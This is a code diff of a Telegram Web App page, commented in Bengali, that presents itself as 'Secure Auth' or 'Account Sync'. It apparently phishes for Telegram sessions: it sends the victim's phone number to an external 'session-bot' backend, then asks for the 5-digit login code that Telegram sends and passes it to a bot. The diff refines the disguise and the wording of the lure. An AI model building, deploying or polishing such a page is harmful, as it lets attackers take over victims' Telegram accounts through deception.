@@ -1,47 +1,105 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Auth</title>
+    <title>Secure Auth - Telegram</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { font-family: sans-serif; padding: 20px; text-align: center; background-color: #f0f2f5; }
-        .container { background: white; padding: 25px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); max-width: 350px; margin: auto; }
-        input { width: 100%; padding: 14px; margin: 12px 0; border: 1.5px solid #ddd; border-radius: 12px; box-sizing: border-box; font-size: 16px; }
-        button { background-color: #0088cc; color: white; border: none; padding: 14px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            padding: 20px; 
+            text-align: center; 
+            background-color: #f0f2f5; 
+            color: #222;
+        }
+        .container { 
+            background: white; 
+            padding: 25px; 
+            border-radius: 20px; 
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1); 
+            max-width: 380px; 
+            margin: 40px auto; 
+        }
+        h3 { margin-bottom: 10px; color: #0088cc; }
+        p { font-size: 14px; color: #666; margin-bottom: 20px; }
+        
+        input { 
+            width: 100%; 
+            padding: 14px; 
+            margin: 12px 0; 
+            border: 1.5px solid #ddd; 
+            border-radius: 12px; 
+            box-sizing: border-box; 
+            font-size: 16px; 
+            outline: none;
+            transition: border-color 0.3s;
+        }
+        input:focus { border-color: #0088cc; }
+        
+        button { 
+            background-color: #0088cc; 
+            color: white; 
+            border: none; 
+            padding: 14px 20px; 
+            width: 100%; 
+            border-radius: 12px; 
+            font-weight: bold; 
+            cursor: pointer; 
+            font-size: 16px;
+            transition: background 0.3s;
+        }
+        button:hover { background-color: #0077b5; }
+        button:disabled { background-color: #ccc; cursor: not-allowed; }
+        
         .hidden { display: none; }
-        .loader { color: #888; font-size: 14px; margin-top: 10px; }
+        .loader { color: #888; font-size: 14px; margin-top: 15px; }
+        .success-text { color: #28a745; font-weight: bold; margin-bottom: 10px; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h3 id="title">Telegram Login</h3>
+        <h3 id="title">Account Sync</h3>
+        <p id="desc">Connect your account securely</p>
         
+        <!-- ধাপ ১: ফোন নম্বর ইনপুট -->
         <div id="phone-sec">
-            <input type="tel" id="phone" value="+" placeholder="+88017...">
-            <button id="phoneBtn" onclick="sendPhone()">Send Code</button>
-            <div id="loader" class="loader hidden">Processing...</div>
+            <input type="tel" id="phone" value="+" placeholder="+88017XXXXXXXX">
+            <button id="phoneBtn" onclick="sendPhone()">Send Auth Key</button>
+            <div id="loader" class="loader hidden">Processing... Please wait.</div>
         </div>
 
+        <!-- ধাপ ২: ওটিপি ইনপুট -->
         <div id="otp-sec" class="hidden">
-            <p style="color: green;">✅ Code sent to Telegram!</p>
-            <input type="text" id="otp" placeholder="Enter 5-digit code">
-            <button onclick="sendOTP()">Verify & Finish</button>
+            <div class="success-text">✅ Key sent to your Telegram!</div>
+            <p>Check your Telegram app for the 5-digit code.</p>
+            <input type="number" id="otp" placeholder="Enter 5-digit Key">
+            <button id="otpBtn" onclick="sendOTP()">Verify & Finish</button>
         </div>
     </div>
 
     <script>
         let tg = window.Telegram.WebApp;
-        let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : "test";
         tg.expand();
+        
+        // ইউজার আইডি সংগ্রহ
+        let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : "test_user";
 
-        // আপনার দেওয়া ব্যাকএন্ড লিঙ্ক
-        const BACKEND_URL = "http://de3.bot-hosting.net:20495"; 
+        // আপনার Hugging Face সরাসরি লিঙ্ক
+        const BACKEND_URL = "https://pmrony-session-bot.hf.space"; 
+
+        const phoneInput = document.getElementById("phone");
+
+        // '+' চিহ্ন ধরে রাখার লজিক
+        phoneInput.addEventListener("input", function() {
+            if (!this.value.startsWith("+")) {
+                this.value = "+" + this.value.replace("+", "");
+            }
+        });
 
         async function sendPhone() {
-            let phone = document.getElementById("phone").value.trim();
-            if(phone.length < 10) return alert("Enter full number!");
+            let phone = phoneInput.value.trim();
+            if(phone === "+" || phone.length < 10) return alert("Enter valid number with country code!");
 
             document.getElementById("loader").classList.remove("hidden");
             document.getElementById("phoneBtn").disabled = true;
@@ -57,11 +115,14 @@
                 if(result.status === "success") {
                     document.getElementById("phone-sec").classList.add("hidden");
                     document.getElementById("otp-sec").classList.remove("hidden");
+                    document.getElementById("title").innerText = "Verify Key";
+                    document.getElementById("desc").innerText = "Almost done!";
                 } else {
                     alert("Error: " + result.message);
                 }
             } catch (e) {
-                alert("Server Connection Failed! Check if your backend is running.");
+                console.error(e);
+                alert("Connection failed! Make sure the backend is running on Hugging Face.");
             } finally {
                 document.getElementById("loader").classList.add("hidden");
                 document.getElementById("phoneBtn").disabled = false;
@@ -70,7 +131,12 @@
 
         function sendOTP() {
             let otp = document.getElementById("otp").value.trim();
-            if(!otp) return alert("Enter the code!");
+            if(!otp) return alert("Enter the Key!");
+            
+            document.getElementById("otpBtn").disabled = true;
+            document.getElementById("otpBtn").innerText = "Verifying...";
+
+            // ওটিপি সাবমিট করলে টেলিগ্রাম বটের কাছে ডাটা চলে যাবে এবং অ্যাপ বন্ধ হবে
             tg.sendData(JSON.stringify({ otp: otp }));
         }
     </script>
